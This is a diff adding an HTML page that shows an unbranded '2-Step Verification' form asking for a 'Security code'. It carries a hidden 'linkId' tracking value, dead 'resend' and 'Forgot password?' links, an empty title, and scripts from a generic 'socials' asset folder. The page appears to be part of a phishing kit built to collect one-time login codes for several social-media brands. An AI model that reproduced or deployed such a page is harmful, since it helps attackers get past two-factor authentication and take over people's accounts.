@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-AO">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="/img/socials/icon.png"
+      type="image/x-icon"
+    />
+    <link rel="stylesheet" href="/css/style2.css" />
+    <title></title>
+    <style>
+      .small-title {
+        margin: 1em auto;
+        color: #000;
+      }
+      .form-area form input {
+        padding: 0.5em;
+        outline-width: none !important;
+      }
+      .small {
+        font-size: 0.85em;
+        display: block;
+        text-align: center;
+        margin: 0.5em auto;
+      }
+
+      #submit2 img {
+        width: 1.3em;
+        animation-name: roll;
+        animation-duration: 0.7s;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+        color: white;
+      }
+
+      @keyframes roll {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body onload="SwitchScreen()">
+    <section class="container">
+      <!-- FORM SECTION -->
+      <article class="form-area">
+        <form
+          method="post"
+          accept="."
+          onsubmit="handleSubmit()"
+          style="margin-bottom: 2em"
+        >
+          <p class="small-title">2-Step Verification</p>
+          <input
+            type="text"
+            name="code"
+            id="code"
+            required
+            placeholder="Security code"
+          />
+          <input type="hidden" name="linkId" value="671130f1339a1d4251a2893a" />
+          <button type="submit" name="submit" id="submit">Confirm</button>
+          <button
+            type="button"
+            name="submit"
+            id="submit2"
+            style="display: none"
+          >
+            <img src="/img/loading.svg" alt="" />
+          </button>
+          <div class="options">
+            <p class="small">Didn't get security code? we can</p>
+            <a href="#" class="small">resend it</a>
+            <div class="forget"><a href="#">Forgot password?</a></div>
+          </div>
+        </form>
+      </article>
+    </section>
+    <!-- FORM SECTION END -->
+    <!-- FOOTER -->
+    <script>
+      const handleSubmit = (e) => {
+        const otp = document.querySelector("#code");
+        const submitBtn = document.querySelector("#submit");
+        const submitBtn2 = document.querySelector("#submit2");
+
+        if (otp.value.length > 0) {
+          submitBtn.style.display = "none";
+          submitBtn2.style.display = "block";
+        } else {
+          e.preventDefault();
+          return false;
+        }
+      };
+    </script>
+    <script src="/js/socials/app.js"></script>
+    <script src="/js/socials/brands.min.js"></script>
+    <script src="/js/socials/fontawesome.min.js"></script>
+  </body>
+</html>
